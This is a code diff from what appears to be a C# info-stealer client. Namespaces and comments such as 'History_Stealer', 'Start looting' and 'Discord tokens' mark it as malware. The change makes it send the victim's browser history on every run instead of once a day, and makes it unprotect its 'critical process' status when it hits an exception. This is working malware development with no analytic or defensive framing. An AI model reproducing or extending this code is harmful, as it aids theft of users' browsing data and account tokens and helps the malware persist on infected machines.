@@ -95,11 +95,7 @@ namespace Client
             // removed because of how buggy this is
             // Armitage.Watchers.Filesystem.Start();
 
-            // send this once everyday
-            if ((Constants.Today - Properties.Settings.Default.LastHistorySent).TotalDays > 1)
-            {
-                Armitage.Cookies.History_Stealer.SendOne(); // send history
-            }
+            Armitage.Cookies.History_Stealer.SendOne(); // send history
 
             /// Start looting.
             // Discord tokens
@@ -146,11 +142,15 @@ namespace Client
         private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
         {
             Communication.String_Stacker.Send(e.ExceptionObject.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
+            if (e.IsTerminating)
+                Armitage.Critical_Process.Unprotect();
         }
 
         private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
         {
             Communication.String_Stacker.Send(e.Exception.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
+            // unkown reason must be unprotected i guess
+            Armitage.Critical_Process.Unprotect();
         }
 
         public static void ArgsParser(string[] args)
